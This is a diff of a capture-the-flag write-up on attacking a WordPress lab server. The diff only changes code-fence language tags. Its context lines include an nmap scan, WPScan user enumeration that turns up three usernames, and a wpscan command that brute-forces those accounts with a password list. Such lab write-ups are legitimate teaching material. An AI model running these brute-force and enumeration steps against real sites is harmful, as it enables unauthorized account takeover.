@@ -20,7 +20,7 @@ In this CTF, I was able to successfully exploit a WordPress server using a combi
 
 
 * Nmap Report:
-  ```sh linenums="1" hl_lines="6 10"
+  ```s linenums="1" hl_lines="6 10"
   # Nmap 7.93 scan initiated Mon Feb 20 13:34:05 2023 as: nmap -sC -sV -O -oN nmap.txt 10.10.237.179
     Nmap scan report for 10.10.237.179
     Host is up (0.15s latency).
@@ -63,7 +63,7 @@ The first step in this process was to enumerate the webserver (WordPress) with i
 
 After running this command, it returned c0ldd, philip, and hugo as usernames.
 
-```sh linenums="1" hl_lines="50 54 58"
+```s linenums="1" hl_lines="50 54 58"
 [+] URL: http://10.10.237.179/ [10.10.237.179]
 [+] Started: Mon Feb 20 13:13:31 2023
 
@@ -136,7 +136,7 @@ I decided to brute force the usernames and passwords using wpscan's built-in fea
     <p id="desc" style="font-size:20px">```wpscan --url $IP -U 'c0ldd,hugo,philip' -P /usr/share/seclists/Passwords/probable-v2-top12000.txt```</p>
     
 
-```sh linenums="1" hl_lines="7 9 10"
+```s linenums="1" hl_lines="7 9 10"
 [+] Enumerating Config Backups (via Passive and Aggressive Methods)
  Checking Config Backups - Time: 00:00:04 <=======================================> (137 / 137) 100.00% Time: 00:00:04
 
